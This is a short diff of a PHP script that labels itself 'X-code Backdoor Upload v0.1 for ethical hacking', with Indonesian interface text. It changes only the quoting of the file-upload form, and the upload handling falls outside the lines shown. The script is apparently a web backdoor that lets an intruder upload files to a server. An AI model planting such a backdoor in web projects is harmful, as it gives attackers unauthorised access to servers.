@@ -8,13 +8,13 @@ echo "Upload berhasil";
 }
 else
 {
-echo "<form enctype=\"multipart/form-data\" action=\"\" method=\"post\" >
+echo '<form enctype="multipart/form-data" action="" method="post">
 <h3><u>X-code Backdoor Upload v0.1 for ethical hacking</u></h3>
 Oleh : Kurniawan - xcode.or.id<br />
-Nama file : <input type=\"file\" name=\"file\" />
+Nama file : <input type="file" name="file" />
 <br />
-<input type=\"submit\" name=\"cekfile\" value=\"Upload\">
-</form>";
+<input type="submit" name="cekfile" value="Upload">
+</form>';
  } 
  }
 ?>
